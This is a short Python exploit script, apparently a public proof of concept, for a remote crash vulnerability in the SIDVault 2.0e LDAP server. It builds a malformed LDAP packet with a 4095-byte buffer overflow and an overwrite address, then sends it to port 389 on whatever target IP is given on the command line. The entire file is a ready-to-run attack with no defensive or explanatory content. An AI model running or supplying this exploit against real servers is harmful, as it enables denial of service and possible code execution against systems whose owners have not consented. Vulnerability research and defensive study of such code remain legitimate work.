#!/usr/bin/python

#
# $ ./ldap.py <target IP>
#
# SIDVault 2.0e Vista  Remote Crash Vulnerability (sidvault.exe )
# Tested on Vista Home premium SP1 Windows XP ,SP1,SP2,SP3
# Coded by:asheesh anaconda 
# Discovery: Joxean Koret
# Group DarkShinners 


import sys
import socket

addr = "\x33\xbf\x96\x7c"
healthpacket = '\x41'*4095 + addr
evilpacket  = '0\x82\x10/\x02\x01\x01c\x82\x10(\x04\x82\x10\x06dc='
evilpacket += healthpacket
evilpacket += '\n\x01\x02\n\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0bobjectClass0\x00'
print "[+] Sending evil packet"
print "[+] Wait ladp is getting crashh!!!!!!!!!!!!"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 389))
s.send(evilpacket)
s.close()
